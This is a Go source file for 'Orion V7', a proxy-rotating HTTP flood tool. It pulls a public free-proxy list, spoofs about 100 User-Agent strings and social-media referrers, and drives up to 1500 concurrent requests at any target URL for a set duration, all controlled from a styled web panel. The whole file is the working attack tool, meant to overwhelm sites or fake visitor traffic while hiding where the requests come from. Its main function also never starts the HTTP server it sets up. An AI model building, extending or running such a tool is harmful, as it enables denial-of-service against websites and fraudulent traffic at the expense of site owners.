package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ========== HIGH-PERFORMANCE CONFIG ==========
const (
	proxyListURL    = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
	maxActiveReqs   = 1500
	maxIdleConns    = 1000
	refreshInterval = 10 * time.Minute
)

// Expanded referrers slice – 15 entries
var referrers = []string{
	"https://www.google.com/",
	"https://www.facebook.com/",
	"https://www.twitter.com/",
	"https://www.bing.com/",
	"https://www.reddit.com/",
	"https://t.co/",
	"https://www.youtube.com/",
	"https://www.instagram.com/",
	"https://www.linkedin.com/",
	"https://www.pinterest.com/",
	"https://www.tumblr.com/",
	"https://www.yahoo.com/",
	"https://www.baidu.com/",
	"https://www.duckduckgo.com/",
	"https://www.wikipedia.org/",
}

// ========== ENGINE STATE ==========
type ProxyNode struct {
	URL        *url.URL
	LastFailed time.Time
}

var (
	proxyPool    []*ProxyNode
	userAgents   []string
	poolMu       sync.RWMutex
	stats        struct {
		Requests uint64
		Errors   uint64
	}
	engineActive int32
	cancelFunc   context.CancelFunc
	currentIndex uint64
)

func main() {
	// Set GC to be less aggressive to allow RAM to hit 200-300MB
	debug.SetGCPercent(150)

	// Initial bootstrapping
	log.Println("[BOOT] Loading User-Agents and Proxies...")
	loadUserAgents()
	loadProxies()

	// Periodic Refreshers
	go func() {
		ticker := time.NewTicker(refreshInterval)
		for range ticker.C {
			loadProxies()
		}
	}()

	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/start", handleStart)
	http.HandleFunc("/stop", handleStop)
	http.HandleFunc("/stats", handleStats)

	port := os.Getenv("PORT")
	if port == "" {
		port = "5000"
	}

	log.Printf("[READY] Orion V7 Luxury Engine active on port %s", port)

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt)
	<-stop
	os.Exit(0)
}

// ========== DATA LOADERS ==========

func loadUserAgents() {
	// Hardcoded user agents list (provided by user)
	userAgents = []string{
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
		"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
		"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
		"Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",
		"Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
		"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
		"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
		"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
		"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
		"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",
		"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",
		"Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
		"Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53",
		"Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0",
	}
	log.Printf("[LOADER] %d User-Agents ready", len(userAgents))
}

func loadProxies() {
	resp, err := http.Get(proxyListURL)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	var newNodes []*ProxyNode
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if u, err := url.Parse(line); err == nil && u.Host != "" {
			newNodes = append(newNodes, &ProxyNode{URL: u})
		} else if u, err := url.Parse("http://" + line); err == nil {
			newNodes = append(newNodes, &ProxyNode{URL: u})
		}
	}

	poolMu.Lock()
	proxyPool = newNodes
	poolMu.Unlock()
	log.Printf("[LOADER] %d Proxies ready", len(newNodes))
}

// ========== ENGINE LOGIC ==========

func getHeaders() (string, string) {
	ua := userAgents[atomic.AddUint64(&currentIndex, 1)%uint64(len(userAgents))]
	ref := referrers[atomic.AddUint64(&currentIndex, 1)%uint64(len(referrers))]
	return ua, ref
}

func getHealthyProxy() *url.URL {
	poolMu.RLock()
	defer poolMu.RUnlock()
	n := len(proxyPool)
	if n == 0 {
		return nil
	}

	// Fast-cycle round robin
	idx := atomic.AddUint64(&currentIndex, 1) % uint64(n)
	node := proxyPool[idx]
	if time.Since(node.LastFailed) < 30*time.Second {
		// If current is failed, try next one immediately
		return proxyPool[(idx+1)%uint64(n)].URL
	}
	return node.URL
}

func handleStart(w http.ResponseWriter, r *http.Request) {
	if atomic.LoadInt32(&engineActive) == 1 {
		return
	}

	target := r.FormValue("target")
	duration, _ := strconv.Atoi(r.FormValue("duration"))

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	cancelFunc = cancel
	atomic.StoreInt32(&engineActive, 1)
	atomic.StoreUint64(&stats.Requests, 0)
	atomic.StoreUint64(&stats.Errors, 0)

	go func() {
		defer atomic.StoreInt32(&engineActive, 0)

		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 60 * time.Second,
			}).DialContext,
			MaxIdleConns:        maxIdleConns,
			MaxIdleConnsPerHost: 200,
			IdleConnTimeout:     90 * time.Second,
			Proxy: func(req *http.Request) (*url.URL, error) {
				return getHealthyProxy(), nil
			},
			DisableCompression: true,
		}
		client := &http.Client{Transport: tr, Timeout: 12 * time.Second}
		semaphore := make(chan struct{}, maxActiveReqs)

		for {
			select {
			case <-ctx.Done():
				return
			default:
				semaphore <- struct{}{}
				go func() {
					defer func() { <-semaphore }()

					req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
					ua, ref := getHeaders()
					req.Header.Set("User-Agent", ua)
					req.Header.Set("Referer", ref)
					req.Header.Set("Accept", "*/*")
					req.Header.Set("Connection", "keep-alive")

					resp, err := client.Do(req)
					if err != nil {
						atomic.AddUint64(&stats.Errors, 1)
						return
					}
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddUint64(&stats.Requests, 1)
				}()
			}
		}
	}()
}

func handleStop(w http.ResponseWriter, r *http.Request) {
	if cancelFunc != nil {
		cancelFunc()
	}
}

func handleStats(w http.ResponseWriter, r *http.Request) {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"requests": atomic.LoadUint64(&stats.Requests),
		"errors":   atomic.LoadUint64(&stats.Errors),
		"active":   atomic.LoadInt32(&engineActive) == 1,
		"ram":      fmt.Sprintf("%dMB", m.Alloc/1024/1024),
		"sys":      fmt.Sprintf("%dMB", m.Sys/1024/1024),
		"proxies":  len(proxyPool),
	})
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, luxuryHTML)
}

const luxuryHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>ORION V7 | PREMIERE</title>
    <style>
        :root { --accent: #d4af37; --bg: #050505; --card: #111111; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .lux-card { background: var(--card); border: 1px solid #222; padding: 40px; border-radius: 4px; width: 420px; box-shadow: 0 40px 100px rgba(0,0,0,0.9); }
        h1 { color: var(--accent); font-weight: 200; text-align: center; letter-spacing: 12px; font-size: 1.1rem; margin-bottom: 40px; }
        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
        .stat-box { border: 1px solid #1a1a1a; padding: 15px; background: #000; }
        .label { font-size: 0.6rem; text-transform: uppercase; color: #555; letter-spacing: 2px; display: block; margin-bottom: 5px; }
        .value { font-family: 'Courier New', monospace; font-size: 1rem; color: #eee; }
        input { width: 100%; background: #000; border: 1px solid #222; padding: 12px; color: var(--accent); margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--accent); }
        .ctrl-btn { width: 100%; padding: 15px; border: 1px solid var(--accent); background: transparent; color: var(--accent); cursor: pointer; transition: 0.4s; letter-spacing: 3px; font-size: 0.7rem; font-weight: bold; }
        .ctrl-btn:hover { background: var(--accent); color: #000; }
        #stopBtn { margin-top: 10px; border-color: #333; color: #333; }
        #stopBtn:hover { border-color: #ff4444; color: #ff4444; background: transparent; }
        .engine-tag { text-align: center; color: #00ff88; font-size: 0.65rem; margin-top: 20px; font-family: monospace; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="lux-card">
        <h1>ORION VII</h1>
        <div class="data-grid">
            <div class="stat-box"><span class="label">Requests</span><span class="value" id="reqs">0</span></div>
            <div class="stat-box"><span class="label">Heap RAM</span><span class="value" id="ram">0MB</span></div>
            <div class="stat-box"><span class="label">OS Memory</span><span class="value" id="sys">0MB</span></div>
            <div class="stat-box"><span class="label">Live Pool</span><span class="value" id="proxies">0</span></div>
        </div>
        <input type="text" id="target" value="https://google.com">
        <input type="number" id="duration" value="3600">
        <button id="startBtn" class="ctrl-btn">INITIATE SESSION</button>
        <button id="stopBtn" class="ctrl-btn">TERMINATE</button>
        <div class="engine-tag" id="status">ENGINE: STANDBY</div>
    </div>
    <script>
        const update = async () => {
            try {
                const res = await fetch('/stats');
                const data = await res.json();
                document.getElementById('reqs').innerText = data.requests.toLocaleString();
                document.getElementById('ram').innerText = data.ram;
                document.getElementById('sys').innerText = data.sys;
                document.getElementById('proxies').innerText = data.proxies;
                document.getElementById('status').innerText = data.active ? 'ENGINE: ACTIVE SESSION' : 'ENGINE: STANDBY';
                document.getElementById('status').style.color = data.active ? '#00ff88' : '#444';
            } catch(e) {}
        };
        document.getElementById('startBtn').onclick = async () => {
            const p = new URLSearchParams({target: document.getElementById('target').value, duration: document.getElementById('duration').value});
            await fetch('/start?' + p.toString());
        };
        document.getElementById('stopBtn').onclick = () => fetch('/stop');
        setInterval(update, 1000);
    </script>
</body>
</html>`
